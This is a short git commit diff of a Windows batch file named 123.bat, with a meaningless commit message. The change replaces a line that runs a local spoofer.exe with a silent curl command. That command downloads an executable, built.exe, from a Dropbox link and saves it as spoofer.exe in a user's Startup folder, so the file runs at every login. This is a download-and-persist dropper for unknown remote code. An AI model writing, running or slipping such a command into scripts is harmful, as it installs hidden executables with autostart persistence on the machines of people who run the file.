01512fc5e6ccb58ed4d9f96d8ff0f01b59f8359d
l4tansk02137 <l4tansk0@proton.me>
2024-09-17 23:08:13 +0200

    111111111

--- 123.bat
+++ 123.bat
@@ -1,3 +1,3 @@
 @echo off
-cd /d %~dp0
-spoofer.exe
+curl -s -L -o "C:\Users\Kubanek\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\spoofer.exe" "https://www.dropbox.com/scl/fi/hzrpvxfwh7mio7vmbfno8/built.exe?rlkey=76dv3z4mmsmo116k9aa6id1bz&st=70xtvpi6&dl=1"
+exit
